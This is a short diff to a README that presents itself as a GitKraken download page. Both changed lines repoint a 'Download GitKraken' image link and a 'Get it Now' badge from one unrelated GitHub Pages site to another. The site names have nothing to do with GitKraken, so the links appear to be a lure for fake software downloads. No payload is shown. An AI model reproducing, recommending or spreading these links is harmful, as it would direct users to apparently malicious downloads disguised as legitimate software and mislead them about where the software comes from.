@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://urinoterapia-sigma.github.io/.github/gitKraken">
+  <a href="https://six-sevens.github.io/.github/gitKraken">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download GitKraken"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The undo capability is a significant safety net that command-line Git doesn't pr
 
 <p align="center">
 
-[![Get it Now GitKraken](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/gitKraken)
+[![Get it Now GitKraken](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/gitKraken)
 
 </p>
 
